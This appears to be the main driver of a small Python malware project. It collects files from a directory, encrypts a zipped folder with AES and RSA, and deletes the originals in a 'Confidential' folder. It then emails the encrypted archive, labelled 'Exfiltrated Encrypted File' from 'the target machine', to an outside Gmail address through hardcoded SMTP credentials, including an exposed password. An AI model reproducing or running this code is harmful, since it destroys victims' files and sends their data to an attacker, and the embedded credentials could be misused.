# Import necessary functions from each script
from collecting_files import file_collection, print_files
from rsaenc2 import generate_rsa_keys, encrypt_aes_key, encrypt_file, zip_folder, delete_confidential_files
from ex2 import send_email_with_attachment
from cryptography.fernet import Fernet
import rsa
import os

# Main execution starts here
if __name__ == "__main__":
    # Step 1: Collect files and create 'files.log'
    path = input("Please enter your directory's path: ")
    collected_files = file_collection(path)
    print_files(collected_files)

    # Step 2: Generate RSA keys if not already present
    generate_rsa_keys()

    # Step 3: Generate a new AES key
    generated_key = Fernet.generate_key()

    # Step 4: Zip the folder (containing the collected files)
    folder_to_encrypt = r"C:/Users/Test 1/Desktop/code/mmm"
    output_zip = r"C:/Users/Test 1/Desktop/code/mmm_backup.zip"
    zip_folder(folder_to_encrypt, output_zip)

    # Step 5: Encrypt the zipped file using AES key
    encrypt_file(output_zip, generated_key)
    encrypted_zip_path = output_zip + ".enc"

    # Step 6: Load RSA public key
    public_key_path = r"C:/Users/Test 1/Desktop/code/public.pem"
    with open(public_key_path, "rb") as f:
        public_key = rsa.PublicKey.load_pkcs1(f.read())

    # Step 7: Encrypt AES key with RSA public key
    encrypt_aes_key(generated_key, public_key)

    # Step 8: Delete original confidential files
    confidential_folder = r"C:/Users/Test 1/Desktop/Confidential"
    delete_confidential_files(confidential_folder)

    # Step 9: Send the encrypted zip file via email and delete it
    send_email_with_attachment(
        sender_email="nnqq9629@gmail.com",
        receiver_email="receiverc76@gmail.com",
        subject="Exfiltrated Encrypted File",
        body="This is the encrypted zip file sent from the target machine.",
        attachment_path=encrypted_zip_path,
        smtp_server="smtp.gmail.com",
        smtp_port=587,
        login="nnqq9629@gmail.com",
        password=" fjunszcfgxeibws"  # WARNING: Replace securely!
    )